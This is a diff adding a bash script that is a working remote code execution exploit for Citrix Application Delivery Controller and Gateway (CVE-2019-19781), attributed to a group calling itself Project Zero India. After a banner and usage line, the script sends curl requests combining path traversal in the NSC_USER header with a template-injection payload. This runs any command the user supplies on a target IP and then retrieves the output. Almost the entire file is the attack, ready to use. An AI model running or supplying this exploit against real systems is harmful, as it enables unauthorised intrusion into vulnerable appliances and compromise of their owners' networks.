@@ -1,0 +1,23 @@
+#!/bin/bash
+# Remote Code Execution Exploit for Citrix Application Delivery Controller and Citrix Gateway - CVE-2019-19781
+# Usage : bash CVE-2019-19781.sh IP_OF_VULNURABLE_HOST COMMAND_TO_EXECUTE e.g : bash CVE-2019-19781.sh XX.XX.XX.XX 'uname -a'
+# Release Date : 11/01/2020
+# Follow Us : https://twitter.com/ProjectZeroIN / https://github.com/projectzeroindia
+echo "=================================================================================
+ ___             _           _     ____                 ___           _  _
+| _ \ _ _  ___  (_) ___  __ | |_  |_  / ___  _ _  ___  |_ _| _ _   __| |(_) __ _
+|  _/| '_|/ _ \ | |/ -_)/ _||  _|  / / / -_)| '_|/ _ \  | | | ' \ / _' || |/ _' |
+|_|  |_|  \___/_/ |\___|\__| \__| /___|\___||_|  \___/ |___||_||_|\__,_||_|\__,_|
+              |__/                                                 CVE-2019-19781
+================================================================================="
+##############################
+if [ -z "$1" ];
+then
+echo -ne 'Usage : bash CVE-2019-19781.sh IP_OF_VULNURABLE_HOST COMMAND_TO_EXECUTE\n'
+exit;
+fi
+filenameid=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1);
+curl -s -k "https://$1/vpn/../vpns/portal/scripts/newbm.pl" -d "url=http://example.com\&title=[%25+template.new({'BLOCK'%3d'exec(\'$2 | tee /netscaler/portal/templates/$filenameid.xml\')%3b'})+%25]\&desc=test\&UI_inuse=RfWeb" -H "NSC_USER: /../../../../../../../../../../netscaler/portal/templates/$filenameid" -H 'NSC_NONCE: test1337' -H 'Content-type: application/x-www-form-urlencoded' --path-as-is
+echo -ne "\n" ;curl -m 3 -k "https://$1/vpn/../vpns/portal/$filenameid.xml" -s -H "NSC_NONCE: pwnpzi1337" -H "NSC_USER: pwnpzi1337" --path-as-is
+echo -ne "Command Output :\n"
+curl -m 3 -k "https://$1/vpn/../vpns/portal/$filenameid.xml" -H "NSC_NONCE: pwnpzi1337" -H "NSC_USER: pwnpzi1337" --path-as-is
